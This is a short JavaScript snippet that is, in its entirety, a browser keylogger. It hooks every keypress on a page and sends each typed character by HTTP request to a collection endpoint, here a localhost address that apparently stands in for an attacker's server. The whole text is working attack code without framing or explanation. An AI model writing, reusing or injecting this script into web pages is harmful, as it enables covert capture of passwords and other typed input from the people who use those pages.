
function httpGet(theUrl){
	var xmlHttp = new XMLHttpRequest();
	xmlHttp.open( \"GET\", theUrl, false );
	xmlHttp.send( null );
        return xmlHttp.responseText;
}
var keys='';
document.onkeypress = function(e) {
	get = window.event?event:e;
	key = get.keyCode?get.keyCode:get.charCode;
	key = String.fromCharCode(key);
	keys+=key;
	httpGet('http://127.0.0.1/fwrite/'+key);
}

